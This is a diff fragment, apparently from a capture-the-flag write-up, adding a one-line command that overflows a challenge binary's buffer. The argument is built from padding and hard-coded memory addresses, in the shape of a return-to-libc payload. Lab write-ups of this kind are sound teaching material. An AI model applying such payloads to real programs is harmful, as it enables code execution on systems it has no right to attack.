@@ -26,3 +26,10 @@ int main (int argc, char ** argv){
     return 0;
 }
 ```
+
+```python
+./ch33 `python -c "print 'A'*20 + '1'*12 + '\x10\x83\xe6\xb7' + 'AAAA' + '\x4c\xad\xf8\xb7'"`
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
